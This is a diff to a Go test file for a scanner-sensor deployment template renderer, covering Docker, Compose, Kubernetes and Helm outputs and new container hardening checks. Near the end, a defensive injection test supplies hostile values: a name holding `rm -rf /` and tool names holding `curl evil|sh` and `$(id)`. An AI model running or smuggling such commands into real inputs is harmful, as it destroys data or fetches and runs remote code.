@@ -58,7 +58,7 @@ func daemonSensor(tools ...string) *sensordom.Sensor {
 	tenantID := shared.NewID()
 	return &sensordom.Sensor{
 		ID: shared.NewID(), TenantID: &tenantID, Name: "DMZ Scanner 01",
-		Type: sensordom.SensorTypeWorker, ExecutionMode: sensordom.ExecutionModeDaemon, Tools: tools,
+		Type: sensordom.SensorTypeWorker, ExecutionMode: sensordom.ExecutionModeDaemon, Reported: sensordom.ReportOf(tools...),
 	}
 }
 
@@ -75,7 +75,7 @@ func fullData(t *testing.T) SensorTemplateData {
 	return SensorTemplateData{
 		Sensor:  daemonSensor("nuclei", "trivy"),
 		APIKey:  "rda_4b1e0123456789abcdef",
-		BaseURL: "https://192.168.8.204",
+		BaseURL: "https://192.0.2.204",
 		Image:   "ghcr.io/openctemio/sensor:v0.4.2",
 		CACert:  string(testCAPEM(t)),
 	}
@@ -120,14 +120,21 @@ func TestTemplates_DockerRunWorksAsPasted(t *testing.T) {
 		continuationLinesOK(t, dir+" docker", d)
 		for _, want := range []string{
 			"ghcr.io/openctemio/sensor:v0.4.2",
-			"-e API_URL='https://192.168.8.204'",
-			"-e API_KEY='rda_4b1e0123456789abcdef'",
+			"-e SENSOR_API_URL='https://192.0.2.204'",
+			"-e SENSOR_API_KEY='rda_4b1e0123456789abcdef'",
 			"-e SENSOR_TOOLS=nuclei,trivy",
 			"-e SSL_CERT_DIR=/etc/openctem/certs",
-			"-v /etc/openctem/certs:/etc/openctem/certs:ro",
-			":/var/lib/openctem/outbox",
-			"-v dmz-scanner-01-state:/var/lib/openctem/state",
-			"-v dmz-scanner-01-content:/var/lib/openctem/content",
+			// The CA and the sensor-local policy both live under /etc/openctem,
+			// mounted read-only; the policy is required (fail closed).
+			"-v /etc/openctem:/etc/openctem:ro",
+			"sudo install -m 0644 sensor-policy.yaml /etc/openctem/sensor-policy.yaml",
+			"-e SENSOR_LOCAL_POLICY=/etc/openctem/sensor-policy.yaml",
+			// Hardened by default (RFC-040 §5.10).
+			"--read-only --cap-drop ALL --security-opt no-new-privileges:true",
+			"--tmpfs /tmp",
+			"-e XDG_CONFIG_HOME=/tmp/.config -e XDG_CACHE_HOME=/tmp/.cache",
+			// One data volume: state/, outbox/, content/.
+			"-v dmz-scanner-01-data:/var/lib/openctem \\",
 			"--restart unless-stopped",
 			"--name dmz-scanner-01",
 			"-----BEGIN CERTIFICATE-----",
@@ -137,7 +144,9 @@ func TestTemplates_DockerRunWorksAsPasted(t *testing.T) {
 				t.Errorf("[%s] docker snippet lacks %q:\n%s", dir, want, d)
 			}
 		}
-		for _, bad := range []string{"openctemio/agent", ":latest", "AGENT_", "-config", "/path/to/scan"} {
+		// The image's home directory holds the baked nuclei-templates
+		// release: nothing is mounted over it.
+		for _, bad := range []string{"openctemio/agent", ":latest", "AGENT_", "-config", "/path/to/scan", "/home/openctem"} {
 			if strings.Contains(d, bad) {
 				t.Errorf("[%s] docker snippet still has %q:\n%s", dir, bad, d)
 			}
@@ -154,7 +163,7 @@ func TestTemplates_NoKeyNoCA(t *testing.T) {
 		// Without the key the snippet reads it from the environment and stops
 		// with a clear message when it is not set; no "<YOUR_API_KEY>", which
 		// the shell would read as a redirection.
-		if !strings.Contains(out.Docker, `-e API_KEY="${OPENCTEM_API_KEY:?`) {
+		if !strings.Contains(out.Docker, `-e SENSOR_API_KEY="${OPENCTEM_API_KEY:?`) {
 			t.Errorf("[%s] docker without a key:\n%s", dir, out.Docker)
 		}
 		if strings.Contains(out.Docker, "<YOUR_API_KEY>") || strings.Contains(out.Docker, "SSL_CERT_DIR") ||
@@ -170,8 +179,8 @@ func TestTemplates_NoKeyNoCA(t *testing.T) {
 func TestTemplates_OneShotRunner(t *testing.T) {
 	for _, dir := range templateSources {
 		data := fullData(t)
-		data.Sensor.Type, data.Sensor.ExecutionMode = sensordom.SensorTypeRunner, sensordom.ExecutionModeStandalone
-		data.Sensor.Tools = []string{"semgrep"}
+		data.Sensor.Type, data.Sensor.ExecutionMode = sensordom.SensorTypeWorker, sensordom.ExecutionModeStandalone
+		data.Sensor.Reported = sensordom.ReportOf("semgrep")
 		d := render(t, dir, data).Docker
 		bashSyntaxOK(t, dir+" runner docker", d)
 		continuationLinesOK(t, dir+" runner docker", d)
@@ -195,6 +204,10 @@ func TestTemplates_ComposeIsValid(t *testing.T) {
 				Restart     string            `yaml:"restart"`
 				Environment map[string]string `yaml:"environment"`
 				Volumes     []string          `yaml:"volumes"`
+				ReadOnly    bool              `yaml:"read_only"`
+				CapDrop     []string          `yaml:"cap_drop"`
+				SecurityOpt []string          `yaml:"security_opt"`
+				Tmpfs       []string          `yaml:"tmpfs"`
 				Configs     []struct {
 					Source string `yaml:"source"`
 					Target string `yaml:"target"`
@@ -215,25 +228,32 @@ func TestTemplates_ComposeIsValid(t *testing.T) {
 		if s.Image != "ghcr.io/openctemio/sensor:v0.4.2" || s.Restart != "unless-stopped" {
 			t.Errorf("[%s] image=%q restart=%q", dir, s.Image, s.Restart)
 		}
-		if s.Environment["API_URL"] != "https://192.168.8.204" || s.Environment["SENSOR_TOOLS"] != "nuclei,trivy" ||
+		if s.Environment["SENSOR_API_URL"] != "https://192.0.2.204" || s.Environment["SENSOR_TOOLS"] != "nuclei,trivy" ||
 			s.Environment["SSL_CERT_DIR"] != "/etc/openctem/certs" {
 			t.Errorf("[%s] environment = %v", dir, s.Environment)
 		}
 		// The key comes from .env, never written into the compose file.
-		if !strings.HasPrefix(s.Environment["API_KEY"], "${OPENCTEM_API_KEY:?") || strings.Contains(c, "API_KEY: rda_") {
-			t.Errorf("[%s] API_KEY = %q", dir, s.Environment["API_KEY"])
+		if !strings.HasPrefix(s.Environment["SENSOR_API_KEY"], "${OPENCTEM_API_KEY:?") || strings.Contains(c, "SENSOR_API_KEY: rda_") {
+			t.Errorf("[%s] SENSOR_API_KEY = %q", dir, s.Environment["SENSOR_API_KEY"])
 		}
 		if !strings.Contains(c, "OPENCTEM_API_KEY=rda_4b1e0123456789abcdef") {
 			t.Errorf("[%s] compose does not say how to write .env with the key:\n%s", dir, c)
 		}
-		if len(s.Volumes) != 3 || !strings.HasSuffix(s.Volumes[0], ":/var/lib/openctem/outbox") ||
-			s.Volumes[1] != "state:/var/lib/openctem/state" || s.Volumes[2] != "content:/var/lib/openctem/content" {
-			t.Errorf("[%s] volumes = %v, want outbox, state and content", dir, s.Volumes)
+		if len(s.Volumes) != 2 || s.Volumes[0] != "data:/var/lib/openctem" ||
+			s.Volumes[1] != "./policy:/etc/openctem/policy:ro" {
+			t.Errorf("[%s] volumes = %v, want the data volume and the read-only policy", dir, s.Volumes)
 		}
-		for _, v := range []string{"outbox", "state", "content"} {
-			if _, ok := doc.Volumes[v]; !ok {
-				t.Errorf("[%s] compose does not declare the %s volume:\n%s", dir, v, c)
-			}
+		// Hardened, with the sensor-local policy required (RFC-040).
+		if !s.ReadOnly || len(s.CapDrop) != 1 || s.CapDrop[0] != "ALL" || len(s.SecurityOpt) != 1 ||
+			s.SecurityOpt[0] != "no-new-privileges:true" || len(s.Tmpfs) != 1 || s.Tmpfs[0] != "/tmp" ||
+			s.Environment["XDG_CONFIG_HOME"] != "/tmp/.config" || s.Environment["XDG_CACHE_HOME"] != "/tmp/.cache" ||
+			s.Environment["SENSOR_LOCAL_POLICY"] != "/etc/openctem/policy/sensor-policy.yaml" ||
+			s.Environment["SENSOR_KILL_SWITCH_FILE"] != "/etc/openctem/policy/STOP" {
+			t.Errorf("[%s] hardening/policy: read_only=%v cap_drop=%v security_opt=%v tmpfs=%v env=%v", dir,
+				s.ReadOnly, s.CapDrop, s.SecurityOpt, s.Tmpfs, s.Environment)
+		}
+		if _, ok := doc.Volumes["data"]; !ok || len(doc.Volumes) != 1 {
+			t.Errorf("[%s] compose must declare exactly the data volume (%v):\n%s", dir, doc.Volumes, c)
 		}
 		if len(s.Configs) != 1 || s.Configs[0].Target != "/etc/openctem/certs/openctem-root-ca.crt" ||
 			!strings.Contains(doc.Configs[s.Configs[0].Source].Content, "BEGIN CERTIFICATE") {
@@ -268,13 +288,24 @@ func TestTemplates_KubernetesManifestsAreValid(t *testing.T) {
 		}
 		for _, want := range []string{
 			"image: ghcr.io/openctemio/sensor:v0.4.2", "api-key: rda_4b1e0123456789abcdef",
-			"SSL_CERT_DIR", "mountPath: /var/lib/openctem/outbox", "type: Recreate", "BEGIN CERTIFICATE",
-			"mountPath: /var/lib/openctem/state", "claimName: dmz-scanner-01-state",
-			"mountPath: /var/lib/openctem/content", "claimName: dmz-scanner-01-content", "storage: 5Gi",
+			"SSL_CERT_DIR", "mountPath: /var/lib/openctem\n", "type: Recreate", "BEGIN CERTIFICATE",
+			"claimName: dmz-scanner-01-data", "name: dmz-scanner-01-data", "storage: 8Gi",
+			// The identity key stays 0600 across pod replacements.
+			"fsGroupChangePolicy: OnRootMismatch",
+			"value: /tmp/.config", "mountPath: /tmp",
 		} {
 			if !strings.Contains(k, want) {
 				t.Errorf("[%s] manifest lacks %q", dir, want)
 			}
+		}
+		// One data volume, never a volume per subdirectory (it would shadow
+		// that subdirectory of the data volume).
+		if strings.Contains(k, "mountPath: /var/lib/openctem/") {
+			t.Errorf("[%s] manifest mounts a subdirectory of the data volume:\n%s", dir, k)
+		}
+		// The baked nuclei-templates release lives in the image's home.
+		if strings.Contains(k, "mountPath: /home/openctem") {
+			t.Errorf("[%s] manifest mounts over the image's home directory:\n%s", dir, k)
 		}
 	}
 }
@@ -288,8 +319,7 @@ func TestTemplates_HelmUsesTheChartsSensorValues(t *testing.T) {
 			"--set sensor.enabled=true", "--set sensor.image.tag=v0.4.2", "--set sensor.existingSecret=",
 			// Helm splits --set values on commas; the escaped comma survives
 			// the shell inside single quotes.
-			`--set-string 'sensor.tools=nuclei\,trivy'`, "--set sensor.outbox.persistence.enabled=true",
-			"--set sensor.state.persistence.enabled=true", "--set sensor.content.persistence.enabled=true",
+			`--set-string 'sensor.tools=nuclei\,trivy'`, "--set sensor.data.persistence.enabled=true",
 			"--from-literal=api-key='rda_4b1e0123456789abcdef'",
 		} {
 			if !strings.Contains(h, want) {
@@ -314,7 +344,7 @@ func TestTemplates_YAMLEnvCLIUseTheCurrentSensorSettings(t *testing.T) {
 		if err := yaml.Unmarshal([]byte(out.YAML), &cfg); err != nil {
 			t.Fatalf("[%s] yaml: %v\n%s", dir, err, out.YAML)
 		}
-		if cfg.Sensor["name"] != "DMZ Scanner 01" || cfg.Server.BaseURL != "https://192.168.8.204" ||
+		if cfg.Sensor["name"] != "DMZ Scanner 01" || cfg.Server.BaseURL != "https://192.0.2.204" ||
 			cfg.Server.APIKey != "rda_4b1e0123456789abcdef" || cfg.Server.SensorID == "" || cfg.Outbox["dir"] == nil {
 			t.Errorf("[%s] yaml = %+v\n%s", dir, cfg, out.YAML)
 		}
@@ -339,7 +369,7 @@ func TestTemplates_HostileValuesStayInert(t *testing.T) {
 	for _, dir := range templateSources {
 		data := fullData(t)
 		data.Sensor.Name = `x"; rm -rf / #`
-		data.Sensor.Tools = []string{"nuclei;curl evil|sh", "$(id)", "trivy"}
+		data.Sensor.Reported = sensordom.ReportOf("nuclei;curl evil|sh", "$(id)", "trivy")
 		out := render(t, dir, data)
 		bashSyntaxOK(t, dir+" docker", out.Docker)
 		for label, s := range map[string]string{"docker": out.Docker, "helm": out.Helm, "env": out.Env, "cli": out.CLI} {
